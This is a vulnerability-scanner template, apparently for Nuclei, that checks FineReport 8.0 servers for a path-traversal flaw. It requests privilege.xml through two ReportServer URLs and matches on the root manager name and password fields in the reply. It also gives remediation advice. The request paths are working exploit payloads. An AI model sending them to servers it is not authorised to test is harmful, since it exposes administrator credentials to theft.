id: finereport-path-traversal

info:
  name: FineReport 8.0 - 本地文件包含漏洞
  author: pikpikcu
  severity: high
  description: |
    该模板用于检测 FineReport 8.0 - 本地文件包含漏洞。该类漏洞通常源于文件路径或资源参数校验不足，导致攻击者可读取非预期文件。模板主要向 `/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml`、`/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml` 等路径发送探测请求，并根据响应中的 `<rootManagerName>`、`<rootManagerPassword>` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可读取服务器本地文件、配置文件、源码或系统敏感文件。
    - 若读取到凭据、密钥或应用配置，可能进一步造成账号接管、数据库访问或远程代码执行。
  remediation: |
    - 使用固定文件 ID 或白名单映射访问文件，避免直接使用用户输入拼接文件路径。
    - 对路径进行规范化校验，拒绝目录穿越、协议包装器和绝对路径访问。
    - 降低 Web 进程文件权限，检查是否已有敏感文件被访问或泄露。
  reference:
    - https://web.archive.org/web/20200506020241/http://foreversong.cn/archives/1378
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22,CWE-73
  metadata:
    max-request: 2
  tags: finereport,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
      - "{{BaseURL}}/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<rootManagerName>"
          - "<rootManagerPassword>"
        part: body
        condition: and

      - type: status
        status:
          - 200
